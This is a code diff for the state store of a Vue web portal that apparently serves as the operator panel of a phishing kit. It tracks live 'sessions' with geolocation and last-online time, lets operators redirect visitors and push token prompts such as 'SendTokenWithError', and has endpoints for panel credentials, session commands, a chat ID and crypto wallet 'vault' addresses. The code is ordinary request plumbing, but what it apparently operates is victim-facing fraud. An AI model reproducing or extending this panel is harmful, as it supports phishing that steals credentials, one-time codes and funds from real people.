@@ -1,7 +1,5 @@
-import Settings from "@/views/Settings.vue";
 import { defineStore, mapActions } from "pinia";
 import { useUserStore } from '@/stores/userStore'
-import { json } from "stream/consumers";
 
 type SettingsProps={
   CFSiteKey:string
@@ -15,21 +13,42 @@ type SettingsProps={
 type Settings={
   [P in keyof SettingsProps as string]: SettingsProps[P]
 }
-
+interface SessionOption{
+  pagefile:string
+  tokenButtonType:string
+  tokenButtonName:string
+  SendTokenWithError:string
+  tokenName:string
+  isMainRow:boolean
+  order:number
+}
 interface Session{
   SessionID:string
-  panelId:string
+  panelID:string
   nodeId:string
+  nodeName:string
+  MainField:string
   Last_Online:number
   Next_Redirect:string|null
   memo:String
+  options:SessionOption[]
+  lat:String,
+  lon:String,
+  country:String,
 }
 interface Panel{ 
   panelId:string
+  panelType?:string
   nodeID:string
   settings:Settings
   access:string
   expires:Date
+  NodeName:string
+}
+
+interface PanelSelection{ 
+  panelId:string
+  nodeID?:string
   NodeName:string
 }
 interface SessionListResponse{
@@ -47,12 +66,24 @@ interface Link{
 }
 interface LinkListResponse{
   status:string,
-  uniqueLinks:Link[]
+  uniqueLinks?:Link[]
 }
 
+interface PanelDataResponse{
+  status:string,
+  data?:any
+}
+
+interface SuccessResponse{
+  status:string,
+}
+interface CreateLinkResponse{
+  status:string,
+  uniqueLink:Link
+}
 interface SessionState{
   panels:Panel[],
-  selectedPanel:Panel|null,
+  selectedPanel:PanelSelection|null,
   sessions:Session[],
   selectedSessions:Session[],
   selectedPanelName:string
@@ -66,8 +97,7 @@ interface SessionState{
 }
 
 const SERVER = ""
-export const useSessionStore = defineStore({
-  id: "sessionStore",
+export const useSessionStore = defineStore('sessionStore',{
   state: () : SessionState => {
     return {
       panels:[],
@@ -92,21 +122,26 @@ export const useSessionStore = defineStore({
       }
       this.updateIntervalIds=[]
     },
+    async clearSession(){
+      this.currentSession=null;
+    },
     async clearSessions(){
       this.sessions=[],
       this.selectedSessions=[]
       this.pageResults=[]
     },
     async setFilter(filter:string){
-      if(this.selectedPanel){
+      if(this.selectedPanel || this.selectedPanelName){
         this.currentFilter=filter
         this.stopUpdates();
         this.clearSessions()
         if(this.selectedPanelName=="ALL"){
-          this.getAllPanelSessions(false,filter)
+          this.getAllPanelSessions(true,filter)
         }
         else{
-          this.getSessionList(this.selectedPanel.panelId,this.selectedPanel.nodeID,false,false,filter)
+          if(this.selectedPanel){
+            this.getSessionList(this.selectedPanel.panelId,this.selectedPanel.NodeName,false,false,filter)
+          }
         }        
       }
     },
@@ -187,6 +222,39 @@ export const useSessionStore = defineStore({
         }
       }
     },
+    async getPanelFMCreds(panelId:string,nodeId:string){
+      const userStore = useUserStore();
+      let options:any={
+        credentials: 'include'
+      }
+      try{
+        let response=await fetch(SERVER+`/portal/panelFMCreds.php?panelId=${panelId}&nodeId=${nodeId}`,options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error loading your info , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
     async getPanelAccessList(panelId:string){
       const userStore = useUserStore();
       let options:any={
@@ -220,57 +288,16 @@ export const useSessionStore = defineStore({
         }
       }
     },
-    async getPanelUniquelinks(panelId:string,nodeId:string){
-      const userStore = useUserStore();
-      let options:any={
-        credentials: 'include'
-      }
-      try{
-        //let response=await fetch(SERVER+`/portal/panelUniquelinks.php?panelId=${panelId}&nodeId=${nodeId}`,options);
-        let response={ok:true,status:200}
-        let responseData={
-          status:"ok",
-          uniqueLinks:[
-            {linkId:"123dkf",data:"dddd"},
-            {linkId:"124dkf",data:"aaaa"},
-            {linkId:"125dkf",data:"bbbb"}
-          ]
-        }
-        if(response.ok){
-          //let responseData=await response.json()
-          return responseData;
-        }
-        else{
-          if(response.status==401){
-            userStore.authenticated=false;
-            return {
-              error:"NOT_AUTHENTICATED",
-              message:"Your session expired, login again"
-            }
-          }
-          return {
-            error:"SERVER_ERROR",
-            message:"There was a error loading your info , try again later"
-          }
-        }
-      }
-      catch(err){
-        console.error(err);
-        return {
-          error:"SERVER_ERROR",
-          message:"There was a error processing your request , try again later"
-        }
-      }
-    },
+    
     async getAllPanelSessions(panelChange:boolean,filter:string){
       this.selectedPanel=null;
       for(let i=0;i<this.panels.length;i++){
         let panel = this.panels[i]
         let mergeNext = (i != 0 || !panelChange) ? true : false
-        this.getSessionList(panel.panelId,panel.nodeID,mergeNext,false,filter)
+        this.getSessionList(panel.panelId,panel.NodeName,mergeNext,false,filter)
       }
     },
-    async getSessionList(panelId:string,nodeId:string,merge:boolean,isUpdate:boolean,filter:string|null){
+    async getSessionList(panelId:string,nodeName:string,merge:boolean,isUpdate:boolean,filter:string|null){
       const userStore = useUserStore();
       if(!merge){
         this.sessions=[]
@@ -279,7 +306,7 @@ export const useSessionStore = defineStore({
       }
       if(!isUpdate){
         let sessionListUpdateInterval=setInterval(()=>{
-          this.getSessionList(panelId,nodeId,true,true,filter)
+          this.getSessionList(panelId,nodeName,true,true,filter)
         },1500);
         this.updateIntervalIds.push(sessionListUpdateInterval);
       }
@@ -287,7 +314,7 @@ export const useSessionStore = defineStore({
         credentials: 'include'
       }
       try{
-        let url=`${SERVER}/portal/sessions.php?panelId=${panelId}&nodeId=${nodeId}`;
+        let url=`${SERVER}/portal/sessions.php?panelId=${panelId}&nodeName=${nodeName}`;
         if(filter){
           url+=`&filter=${filter}`;
         }
@@ -298,13 +325,14 @@ export const useSessionStore = defineStore({
             let combinedSessions:Session[] = []
             let newSessionsDetected  = false
             responseData.sessions = responseData.sessions.map(session => {
-              session.nodeId=nodeId
-              return session
+              session.nodeName=nodeName
+              session.memo= session.memo ? session.memo : "";
+              return session 
             })
             if(!merge){
               combinedSessions = responseData.sessions;
               combinedSessions = combinedSessions.map(item =>{
-                item.panelId = panelId;
+                item.panelID = panelId;
                 return item
               });
             }
@@ -326,7 +354,7 @@ export const useSessionStore = defineStore({
                 }
               }
               newSessions=newSessions.map(item =>{
-                item.panelId = panelId;
+                item.panelID = panelId;
                 return item
               });
               if(newSessions.length>0){
@@ -389,6 +417,7 @@ export const useSessionStore = defineStore({
         let sessionRes=await this.getSession(sessionId,panel.panelId,panel.nodeID)
         if(!sessionRes.error){
           if(sessionRes.session){
+            this.cancelSessionReload=false;
             this.getSession(sessionId,panel.panelId,panel.nodeID);
             this.refreshSession(sessionId,panel.panelId,panel.nodeID,interval)
             return sessionRes;
@@ -459,7 +488,7 @@ export const useSessionStore = defineStore({
       }
       if(!test){
         data.append('sessionId',this.currentSession.SessionID);
-        data.append('panelId',this.currentSession.panelId);
+        data.append('panelId',this.currentSession.panelID);
         data.append('nodeId',this.currentSession.nodeId);
       }
       data.append('newRedirect',newRedirect);
@@ -512,7 +541,7 @@ export const useSessionStore = defineStore({
     async savePanelSettings(panelId:string,nodeId:string,settings:Settings){
       const userStore = useUserStore();
       let data=new FormData();
-      let fields=["Mobile_Only","Enable_Captcha","Enable_Turnstile","Redirect_All","CFSiteKey","CFSiteSecret"];
+      let fields=["Mobile_Only","Enable_Captcha","Enable_Turnstile","Enable_Panel_ChatId","ChatId","Redirect_All","CFSiteKey","CFSiteSecret"];
       data.append('panelId',panelId);
       data.append('nodeId',nodeId);
       for(let field of fields){
@@ -571,7 +600,7 @@ export const useSessionStore = defineStore({
         data.append('sessionId',"testsession");
       }
       if(!test){
-        data.append('panelId',this.currentSession.panelId);
+        data.append('panelId',this.currentSession.panelID);
         data.append('nodeId',this.currentSession.nodeId);
       }
       data.append('newRedirect',newRedirect);
@@ -614,11 +643,61 @@ export const useSessionStore = defineStore({
         }
       }
     },
+    async sessionCmd(cmd:string,test:boolean){
+      const userStore = useUserStore();
+      if(!this.currentSession || !cmd){
+        return
+      }
+      let data=new FormData();
+      if(!test){
+        data.append('sessionId',this.currentSession.SessionID);
+      }
+      else{
+        data.append('sessionId',"testsession");
+      }
+      if(!test){
+        data.append('panelId',this.currentSession.panelID);
+        data.append('nodeId',this.currentSession.nodeId);
+      }
+      data.append("cmd",cmd);
+      let options:any={
+        credentials: 'include',
+        method:"POST",
+        body: data  
+      }
+      try{
+        let response=await fetch(SERVER+'/portal/sessionCmd.php',options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error running the command , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
     async bookmarkSession(session:Session,bookmarked:boolean){
       const userStore = useUserStore();
       let data=new FormData();
-      data.append('panelId',session.panelId);
-      let node=this.panels.find(panel => session.panelId == panel.panelId)
+      data.append('panelId',session.panelID);
+      let node=this.panels.find(panel => session.panelID == panel.panelId)
       if(!node){
         return false;
       }
@@ -678,8 +757,8 @@ export const useSessionStore = defineStore({
     async deleteSession(session:Session){
       const userStore = useUserStore();
       let data=new FormData();
-      data.append('panelId',session.panelId);
-      let node=this.panels.find(panel => session.panelId == panel.panelId)
+      data.append('panelId',session.panelID);
+      let node=this.panels.find(panel => session.panelID == panel.panelId)
       if(!node){
         return false;
       }
@@ -722,8 +801,8 @@ export const useSessionStore = defineStore({
     async updateMemo(session:Session,memo:string){
       const userStore = useUserStore();
       let data=new FormData();
-      data.append('panelId',session.panelId);
-      let node=this.panels.find(panel => session.panelId == panel.panelId)
+      data.append('panelId',session.panelID);
+      let node=this.panels.find(panel => session.panelID == panel.panelId)
       if(!node){
         return false;
       }
@@ -906,6 +985,284 @@ export const useSessionStore = defineStore({
       formData.append("nodeName",nodeName);
       formData.append("panelId",panelId);
       xhr.send(formData);
-    }
-  },
+    },
+    
+    async getUniqueLinks(panelId:string,nodeId:string){
+      const userStore = useUserStore();
+      let options:any={
+        credentials: 'include'
+      }
+      try{
+        let response=await fetch(SERVER+`/portal/uniqueLinks.php?panelId=${panelId}&nodeId=${nodeId}`,options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData as LinkListResponse;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error loading your info , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
+    
+    async getPanelData(panelId:string,nodeId:string){
+      const userStore = useUserStore();
+      let options:any={
+        credentials: 'include'
+      }
+      try{
+        let response=await fetch(SERVER+`/portal/panelData.php?panelId=${panelId}&nodeId=${nodeId}`,options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData as PanelDataResponse;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error loading your info , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
+    
+    async saveUniqueLink(panelId:string,nodeName:string,linkId:string,linkData:string){
+      const userStore = useUserStore();
+      let data=new FormData();
+      data.append('panelId',panelId);
+      data.append('nodeName',nodeName);
+      data.append('linkId',linkId);
+      data.append('data',linkData);
+      let options:any={
+        credentials: 'include',
+        method:"POST",
+        body: data
+      }
+      try{
+        let response=await fetch(SERVER+'/portal/editUniqueLink.php',options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error saving the data , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
+    
+    async deleteUniqueLink(panelId:string,nodeName:string,linkId:string){
+      const userStore = useUserStore();
+      let data=new FormData();
+      data.append('panelId',panelId);
+      data.append('nodeName',nodeName);
+      data.append('linkId',linkId);
+      let options:any={
+        credentials: 'include',
+        method:"POST",
+        body: data
+      }
+      try{
+        let response=await fetch(SERVER+'/portal/deleteUniqueLink.php',options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error saving the data , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
+    
+    async addUniqueLink(panelId:string,nodeName:string,linkData:string,field:string){
+      const userStore = useUserStore();
+      let data=new FormData();
+      data.append('panelId',panelId);
+      data.append('nodeName',nodeName);
+      data.append('field',field);
+      data.append('data',linkData);
+      let options:any={
+        credentials: 'include',
+        method:"POST",
+        body: data
+      }
+      try{
+        let response=await fetch(SERVER+'/portal/addUniqueLink.php',options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error saving the data , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
+    
+    async saveWalletToken(panelId:string,nodeName:string,tokenId:string,addr:string,bal:string){
+      const userStore = useUserStore();
+      let data=new FormData();
+      let addrkey=`vault_${tokenId}_addr`;
+      let balkey=`vault_${tokenId}_bal`;
+      data.append('panelId',panelId);
+      data.append('nodeName',nodeName);
+      //data.append('tokenId',tokenId)
+      data.append(addrkey,addr);
+      data.append(balkey,bal);
+      let options:any={
+        credentials: 'include',
+        method:"POST",
+        body: data
+      }
+      try{
+        let response=await fetch(SERVER+'/portal/savePanelData.php',options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error saving the data , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
+    
+    async deleteWalletToken(panelId:string,nodeName:string,tokenId:string){
+      const userStore = useUserStore();
+      let data=new FormData();
+      let addrkey=`vault_${tokenId}_addr`;
+      let balkey=`vault_${tokenId}_bal`;
+      data.append('panelId',panelId);
+      data.append('nodeName',nodeName);
+      //data.append('tokenId',tokenId)
+      data.append(addrkey,"");
+      data.append(balkey,"");
+      let options:any={
+        credentials: 'include',
+        method:"POST",
+        body: data
+      }
+      try{
+        let response=await fetch(SERVER+'/portal/deletePanelData.php',options);
+        if(response.ok){
+          let responseData=await response.json()
+          return responseData;
+        }
+        else{
+          if(response.status==401){
+            userStore.authenticated=false;
+            return {
+              error:"NOT_AUTHENTICATED",
+              message:"Your session expired, login again"
+            }
+          }
+          return {
+            error:"SERVER_ERROR",
+            message:"There was a error saving the data , try again later"
+          }
+        }
+      }
+      catch(err){
+        console.error(err);
+        return {
+          error:"SERVER_ERROR",
+          message:"There was a error processing your request , try again later"
+        }
+      }
+    },
+  }
 });
